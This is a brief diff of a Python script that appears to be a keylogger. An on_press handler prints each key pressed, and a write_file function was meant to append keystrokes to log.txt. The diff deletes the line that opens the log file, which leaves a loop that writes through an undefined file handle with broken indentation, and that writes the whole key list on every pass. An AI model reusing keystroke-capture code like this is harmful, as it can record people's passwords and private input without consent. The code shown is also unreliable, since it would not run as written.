@@ -9,7 +9,6 @@ def on_press(key):
     print("{0} Pressionado".format(key))
 
 def write_file(keys):
-    with open("log.txt", "a") as f:
         for key in keys:
             f.write(keys)
 
